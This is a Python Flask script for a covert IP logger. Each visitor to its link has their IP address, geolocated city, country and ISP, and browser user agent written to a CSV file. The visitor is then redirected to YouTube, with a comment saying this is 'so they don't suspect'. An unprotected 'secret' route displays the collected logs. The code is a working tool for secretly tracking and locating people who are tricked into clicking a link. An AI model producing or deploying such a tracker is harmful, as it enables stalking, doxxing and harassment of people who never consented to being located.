from flask import Flask, request, redirect
import requests
import csv
from datetime import datetime
import os

app = Flask(__name__)
LOG_FILE = "logs.csv"

# Create log file if it doesn't exist
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['Timestamp', 'IP', 'City', 'Country', 'ISP', 'Device'])

def get_ip_info(ip):
    """Get geolocation data from ip-api.com"""
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp")
        data = response.json()
        if data.get('status') == 'success':
            return {
                'city': data.get('city', 'Unknown'),
                'country': data.get('country', 'Unknown'),
                'isp': data.get('isp', 'Unknown')
            }
    except:
        pass
    return {'city': 'Unknown', 'country': 'Unknown', 'isp': 'Unknown'}

@app.route('/')
def index():
    # Get visitor IP
    ip = request.remote_addr
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    
    # Get device info
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Get location
    info = get_ip_info(ip)
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Save to CSV
    with open(LOG_FILE, 'a', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow([timestamp, ip, info['city'], info['country'], info['isp'], user_agent])
    
    # Redirect to a real website so they don't suspect
    return redirect('https://www.youtube.com')

@app.route('/view-logs')
def view_logs():
    """Secret log viewer — ONLY YOU should know this URL"""
    if not os.path.exists(LOG_FILE):
        return "No logs yet."
    with open(LOG_FILE, 'r', encoding='utf-8') as f:
        logs = f.read()
    return f"<pre style='font-size:14px;'>{logs}</pre>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)